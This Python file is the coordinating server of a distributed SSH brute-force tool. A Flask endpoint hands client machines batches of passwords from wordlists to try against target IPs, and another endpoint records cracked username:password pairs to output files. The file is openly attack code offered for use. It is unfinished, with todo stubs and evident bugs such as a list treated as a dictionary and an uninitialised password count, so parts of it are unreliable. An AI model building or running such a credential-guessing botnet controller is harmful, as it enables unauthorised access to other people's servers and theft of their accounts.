'''
This Server control the clients
'''
import sys
from optparse import OptionParser
import logging
import json
import common

from flask import (
    Flask,
    request,
    redirect
)


class Server():
    def __init__(self):
        self.info = "Simple Distributed SSH Brute Forcer"
        # self.targetIp = ""
        self.targetPort = 0
        self.targets = []
        self.usernames = []
        self.passwords = []
        self.passwordsFiles = []
        self.connections = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0
        self.timeoutTime = 0
        self.outputDir = 'output'
        self.outputFileName = ""
        self.singleMode = False
        self.verbose = False
        self.listenPort = 3000
        self.listenIp = '0.0.0.0'
        self.sessions = []  # client sessions
        self.passwordCounts = 0  # passwords file total line counts
        self.passwordsNumPerClient = 1000  # passwords num serve to one client
        self.currentPasswordsIdx = 0
        self.currentPasswordsFileIdx = 0  # current passwords file index
        self.currentTargetIpIdx = 0  # current target ip index for brute force
        self.currentUsernameIdx = 0  # current username index for brute force
        self.currentPasswordsCount = 0
        self.cfgPath = 'config.json'
        self.cfg = {}
        self.bruteAllUser = 0  # whether brute all usernames

    def StartUp(self):
        usage = '%s [-i targetIp] [-U usernamesFile] [-P passwordsFile]' % sys.argv[0]

        optionParser = OptionParser(version=self.info, usage=usage)

        optionParser.add_option('-i', dest='targetIp',
                                help='Ip to attack')
        optionParser.add_option('-p', dest='targetPort',
                                help='Ip port to attack', default=22)
        optionParser.add_option('-I', dest='targetsFile',
                                help='List of IP\'s and ports')
        optionParser.add_option('-U', dest='usernamesFile',
                                help='Username List file')
        optionParser.add_option('-P', dest='passwordsFile',
                                help='Password List file')
        optionParser.add_option('-D', dest='passwordsDirectory',
                                help='Password Directory')
        optionParser.add_option('-T', type='int', dest='timeout',
                                help='Timeout Time', default=15)
        optionParser.add_option('-O', dest="outputFile",
                                help='Output File Name')
        optionParser.add_option('-v', '--verbose',
                                dest='verbose', help='verbose')
        # optionParser.add_option('-A', '--verbose',
        #                         dest='bruteAllUser', help='whether brute all usernames')

        (options, args) = optionParser.parse_args()

        self.cfg = common.GetJsonFileConfig(self.cfgPath)

        # targets
        # todo:more expression
        if options.targetIp:
            self.targets.append(options.targetIp)
        else:
            if not options.targetsFile:
                logging.error("Please specify targets by using -i or -I")
                sys.exit(1)
            self.targets = common.File2ListByLine(options.targetsFile)

        if not options.usernamesFile:
            options.usernamesFile = '../resource/usernames.txt'  # todo fix method of finding when execute this py file in different path
        self.usernames = common.File2ListByLine(options.usernamesFile)

        if not options.passwordsFile and not options.passwordsDirectory:
            self.passwordsFiles.append(
                '../resource/passwords.txt')  # todo fix method of finding when execute this py file in different path
        if options.passwordsFile:
            self.passwordsFiles.append(options.passwordsFile)

        # if options.bruteAllUser:
        #     self.bruteAllUser = 1

        # self.passwordCounts = common.FileTotalCounts(options.passwordsFile)

        common.Mkdir(self.outputDir)

        self.StartServer(options)

    def CurrentOutputPath(self):
        return self.outputDir + '/' + self.targets[self.currentTargetIpIdx]

    def LogSuccess(self, username, password):
        with open(self.CurrentOutputPath(), 'a') as fp:
            fp.write('%s:%s' % (username, password))

    def GetCurrentUsername(self):
        return self.currentUsernameIdx, self.usernames[self.currentUsernameIdx]

    def GetCurrentTargetIp(self):
        return self.currentTargetIpIdx, self.targets[self.currentTargetIpIdx]

    def UpdateSession(self, cid, target_idx, user_idx, pwdf_idx, pwd_idx):
        if cid not in self.sessions:
            self.sessions[cid] = {}
        sess = self.sessions[cid]
        sess['target_ip'] = self.targets[target_idx]
        sess['username'] = self.usernames[user_idx]
        sess['pwd_file'] = self.passwordsFiles[pwdf_idx]
        sess['start_pwd_idx'] = pwd_idx

    def IncPasswordsIdx(self, startIdx):
        if startIdx >= self.currentPasswordsCount:
            startIdx = 0
            self.currentPasswordsIdx = 0
            self.currentPasswordsFileIdx = self.currentPasswordsFileIdx + 1
            # if all passwords files have been tried.
            if self.currentPasswordsFileIdx == len(self.passwordsFiles):
                self.currentTargetIpIdx = self.currentTargetIpIdx + 1

            # if all targets have been tried, exit
            if self.currentTargetIpIdx == len(self.targets):
                sys.exit(1)  # todo do what when all targets have been tried
        endIdx = startIdx + self.passwordsNumPerClient
        if endIdx > self.currentPasswordsCount:
            endIdx = self.currentPasswordsCount
        return endIdx


    # check all client status  every 60 minutes.
    # todo
    def CheckStatus(self):
        pass

    # http server for serving data to clients
    # todo encrypt message between server and client
    def StartServer(self, options):
        app = Flask(__name__)

        # serve passwords for clients
        @app.route('/task', methods=['POST'])
        def task():
            cid = request.form['id']
            pwdfIdx = self.currentPasswordsFileIdx
            path = self.passwordsFiles[pwdfIdx]
            startIdx = self.currentPasswordsIdx
            endIdx = self.IncPasswordsIdx(startIdx)
            targetIdx, targetIp = self.GetCurrentTargetIp()
            username_idx, username = self.GetCurrentUsername()
            taskData = {
                "target_ip": targetIp,
                "username": username,
                "passwords": common.GetFileRangeLines(path, startIdx, endIdx)
            }

            self.UpdateSession(cid, targetIp, username_idx, pwdfIdx, startIdx)

            return json.dumps(taskData)

        # when a client find a correct username&password pair
        @app.route('/success', methods=['POST'])
        def success():
            username = request.form['username']
            password = request.form['password']
            self.LogSuccess(username, password)
            if not self.bruteAllUser:
                pass
                # todo send message to all clients

        # when a client did not find a correct username&password pair within the given wordlist
        @app.route('/fail', methods=['POST'])
        def fail():
            pass
            # todo use client id to do something
            # cid = request.form['id']
            # self.currentPasswordsIdx = self.IncPasswordsIdx(self.currentPasswordsIdx)

            # if current passwords file go to the end
            # if self.currentPasswordsIdx == self.currentPasswordsCount:
            # self.currentPasswordsFileIdx = self.currentPasswordsFileIdx + 1

        app.run(self.listenIp, port=self.listenPort)


if __name__ == '__main__':
    Server().StartUp()
